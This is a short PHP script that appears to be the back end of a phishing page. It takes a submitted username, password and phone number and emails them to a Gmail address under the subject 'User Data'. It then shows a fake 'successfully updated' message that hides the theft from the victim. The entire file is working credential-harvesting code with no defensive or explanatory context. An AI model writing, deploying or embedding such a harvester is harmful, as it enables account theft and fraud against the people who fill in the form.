<?php
$user=$_POST['username'];
$pass=$_POST['password'];
$phone=$_POST['tel'];
$to="example@gmail.com";
$message="$user+$pass+$phone";
$subject="User Data";
mail($to,$subject,$message);
echo 'Your Data was successfuly updated!';
?>
